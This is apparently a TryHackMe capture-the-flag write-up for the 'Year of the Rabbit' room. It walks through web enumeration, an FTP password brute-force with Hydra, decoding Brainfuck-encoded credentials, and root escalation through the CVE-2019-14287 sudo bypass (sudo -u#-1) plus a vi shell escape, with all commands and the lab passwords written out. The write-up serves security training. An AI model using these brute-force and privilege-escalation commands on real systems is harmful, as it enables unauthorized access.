# Year of the Rabbit — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Year of the Rabbit  
**Difficulty:** Easy  
**Tags:** FTP brute-force, steganography, Brainfuck, HTTP header analysis, CVE-2019-14287, sudo bypass, vi shell escape  

---

## Overview

A multi-layered boot2root machine with plenty of rabbit holes (pun intended). The attack path goes through web enumeration with hidden redirects, steganography in a PNG file, Brainfuck-encoded credentials, lateral movement between two users, and a classic sudo version exploit for root.

- **User flag:** `THM{}`
- **Root flag:** `THM{1}`

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -O -p- 10.66.144.58
```

Key findings:
- **21/tcp** — FTP (vsftpd 3.0.2)
- **22/tcp** — SSH (OpenSSH 6.7p1 Debian)
- **80/tcp** — HTTP (Apache 2.4.10 Debian — default page)
- OS: Linux 3.10–3.13

Anonymous FTP login was attempted first but failed — `530 Login incorrect`.

### Web / Directory Enumeration

```bash
gobuster dir -u http://10.66.144.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
```

Results:
- `/index.html` (200) — Apache default page
- `/assets/` (301) — directory listing enabled

---

## Web Enumeration — Following the Rabbit Holes

### /assets/ Directory

Directory listing revealed two files:
- `RickRolled.mp4` — a full Rick Astley music video (rickroll / red herring)
- `style.css` — contained a hidden comment:

```
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php */
```

### /sup3r_s3cr3t_fl4g.php — The Hidden Redirect

Visiting this page in a browser triggered a JavaScript alert ("Turn off your javascript") and redirected to YouTube (another rickroll).

Using `curl` without JavaScript showed a `<noscript>` message:

> "The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!"

This was a **deliberate misdirection**. The video/audio contained no useful information.

### The Real Find — HTTP Response Headers

```bash
curl -I http://10.66.144.58/sup3r_s3cr3t_fl4g.php
```

```
HTTP/1.1 302 Found
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

The PHP script returned a **302 redirect**, and the `Location` header leaked a hidden directory path in the GET parameter: `/WExYY2Cv-qU`.

> **Key technique:** `curl -I` sends a HEAD request — returns only response headers. Browsers follow redirects automatically, hiding this information. Always check raw headers on suspicious pages.

---

## FTP Credentials — Steganography in PNG

### Hidden Directory Contents

```bash
curl -s http://10.66.144.58/WExYY2Cv-qU/
```

Directory listing contained a single file: `Hot_Babe.png` (464K).

### Extracting Hidden Data

```bash
wget http://10.66.144.58/WExYY2Cv-qU/Hot_Babe.png
strings Hot_Babe.png
```

The `strings` output revealed text appended **after the PNG file data**:

```
Eh, you've earned this. Username for FTP is ftpuser
```

Followed by a list of ~82 potential passwords. These were saved to `passwords.txt`.

### Hydra Brute-Force

```bash
hydra -l ftpuser -P passwords.txt 10.66.144.58 ftp
```

```
[21][ftp] host: 10.66.144.58   login: ftpuser   password: 5iez1wGXKfPKQ
```

---

## FTP — Brainfuck Encoded Credentials

```bash
ftp 10.66.144.58
# login: ftpuser / 5iez1wGXKfPKQ
ftp> get Eli's_Creds.txt
```

> **Note:** File name contains an apostrophe. Use quotes when working with it in shell: `cat "Eli's_Creds.txt"`

Contents — Brainfuck code:

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +...
```

### Decoding Brainfuck

Brainfuck is an esoteric programming language using only 8 characters: `+ - > < [ ] . ,`. It's commonly used in CTFs to obfuscate text. Decoded using a Python interpreter:

```python
python3 -c "
code = open(\"Eli's_Creds.txt\").read()
tape, ptr, pc, out = [0]*30000, 0, 0, []
brackets = {}
stack = []
for i,c in enumerate(code):
    if c=='[': stack.append(i)
    if c==']': j=stack.pop(); brackets[j]=i; brackets[i]=j
while pc < len(code):
    c = code[pc]
    if c=='>': ptr+=1
    elif c=='<': ptr-=1
    elif c=='+': tape[ptr]=(tape[ptr]+1)%256
    elif c=='-': tape[ptr]=(tape[ptr]-1)%256
    elif c=='.': out.append(chr(tape[ptr]))
    elif c=='[' and tape[ptr]==0: pc=brackets[pc]
    elif c==']' and tape[ptr]!=0: pc=brackets[pc]
    pc+=1
print(''.join(out))
"
```

**Result:** `eli:DSpDiM1wAEwid`

---

## SSH Access — User eli

```bash
ssh eli@10.66.144.58
# Password: DSpDiM1wAEwid
```

### MOTD Message (Initially Missed!)

Upon SSH login, a message was displayed:

```
1 new message
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place.
 I've left you a hidden message there"
END MESSAGE
```

### Post-Login Enumeration

- `sudo -l` — eli has no sudo privileges
- SUID binaries — all standard, no custom binaries
- `/etc/passwd` — reveals second user: **gwendoline**
- `user.txt` is in `/home/gwendoline/` — owned by gwendoline, not readable by eli
- Core dump in eli's home — `strings` revealed nothing useful

### Finding the Secret

The MOTD mentioned a "leet s3cr3t hiding place":

```bash
find / -name "*s3cr3t*" 2>/dev/null
```

```
/usr/games/s3cr3t
```

```bash
ls -la /usr/games/s3cr3t/
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
```

```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
Yours sincerely
   -Root
```

### Lateral Movement

```bash
su gwendoline
# Password: MniVCQVhQHUNI
cat ~/user.txt
```

**User flag:** `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`

---

## Privilege Escalation — CVE-2019-14287

### Sudo Enumeration

```bash
sudo -l
```

```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Gwendoline can run `vi` as **any user except root** without a password.

### Sudo Version Check

```bash
sudo --version
# Sudo version 1.8.10p3
```

Version 1.8.10 is vulnerable to **CVE-2019-14287** (patched in 1.8.28). This bug allows bypassing the `!root` restriction by specifying UID `-1` or `4294967295`, which sudo incorrectly resolves to UID 0 (root).

### Exploitation

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside vi, spawn a root shell:

```
:!/bin/bash
```

```bash
root@year-of-the-rabbit:/root# cat /root/root.txt
```

**Root flag:** `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`

---

## Attack Path Summary

```
Nmap scan (3 ports: FTP, SSH, HTTP)
  → Gobuster → /assets/ → style.css → /sup3r_s3cr3t_fl4g.php
    → curl -I → 302 Location header leaks /WExYY2Cv-qU
      → Hot_Babe.png → strings → FTP username + password list
        → Hydra brute-force → ftpuser:5iez1wGXKfPKQ
          → FTP → Eli's_Creds.txt → Brainfuck → eli:DSpDiM1wAEwid
            → SSH as eli → MOTD message → /usr/games/s3cr3t/
              → gwendoline password → su gwendoline → user.txt
                → sudo -l → (ALL, !root) vi → CVE-2019-14287
                  → sudo -u#-1 vi → :!/bin/bash → root
```

---

## Mistakes & Missed Steps

| What happened | Impact | Lesson |
|---|---|---|
| Missed MOTD message on SSH login | Wasted time running broad `find` and `grep` searches looking for gwendoline's credentials, when the hint was shown immediately upon connection | **Always read SSH banners and MOTD messages carefully.** They are a common place to hide hints in CTFs and can contain real security notices in production |
| Spent time analyzing RickRolled.mp4 audio | Followed the "hint is in the video" misdirection; listened to audio, ran strings on the file | The video was a deliberate rabbit hole. When initial analysis yields nothing, move on quickly and explore other vectors |
| Did not check HTTP headers early enough | The 302 redirect with the hidden directory was the critical find, but was discovered only after exhausting the video rabbit hole | **Make `curl -I` and `curl -v` a standard step** for every interesting endpoint. Browsers hide redirects; raw headers don't lie |

---

## New Techniques Learned

- **`curl -I` for header inspection** — HEAD requests reveal redirects, hidden parameters, and server info that browsers auto-follow and hide
- **Brainfuck recognition and decoding** — esoteric language using `+ - > < [ ] . ,` characters; common in CTF obfuscation. Other esoteric languages to know: Ook!, Malbolge, Whitespace
- **Data appended after PNG EOF** — `strings` on image files can reveal text hidden after the image data ends (not traditional steganography, but data concatenation)
- **CVE-2019-14287** — sudo < 1.8.28 allows `!root` bypass via `sudo -u#-1`. Always check `sudo --version` when `sudo -l` shows restricted rules
- **Vi shell escape** — `:!/bin/bash` spawns a shell inheriting vi's privilege level. Works with many programs: less, more, man, nmap (old versions). Reference: [GTFOBins](https://gtfobins.github.io/)

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning, service/OS detection |
| gobuster | Web directory brute-force |
| curl | HTTP requests, header inspection (`-I`), following redirects |
| strings | Extracting readable text from binary/image files |
| hydra | FTP password brute-force |
| ftp | File retrieval from FTP server |
| python3 | Brainfuck decoder script |
| vi | Privilege escalation via shell escape |
| sudo | Exploited CVE-2019-14287 for root access |

---

## Skills Reinforced

- Web enumeration (source code, CSS, hidden paths)
- HTTP protocol analysis (redirects, headers)
- FTP brute-forcing with credential lists
- Lateral movement between users via discovered credentials
- Linux privilege escalation (sudo misconfigurations, CVE exploitation)
- GTFOBins-style shell escapes from text editors
